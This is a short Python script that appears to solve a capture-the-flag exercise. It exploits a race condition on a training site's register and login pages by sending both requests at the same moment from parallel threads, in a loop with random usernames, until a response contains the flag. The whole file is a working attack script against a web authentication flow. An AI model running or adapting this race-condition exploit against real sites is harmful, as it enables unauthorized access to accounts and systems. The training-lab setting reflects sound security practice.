#! /usr/bin/python3
import requests
import random
import string
import threading
import time

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://10.10.1.10:1080',
}

def randomuser(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(10))


def login(session, login_info):
    logged = session.post("http://aart.training.jinblack.it/login.php", data=login_info)
    if "flag" in logged.text:
        print(logged.text)
    return logged.text


def register(session, reg_info):
    response = session.post("http://aart.training.jinblack.it/register.php", data=registration_info)
    #print(response.text)
    return response.text


while True:
    username = randomuser()
    print(username)
    password = "password"
    login_info = {"username": username, "password": password}
    registration_info = {"username": username, "password": password}
    session = requests.Session()
    t1 = threading.Thread(target=register, args=(session, registration_info))
    t2 = threading.Thread(target=login, args=(session, login_info))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    time.sleep(0.1)
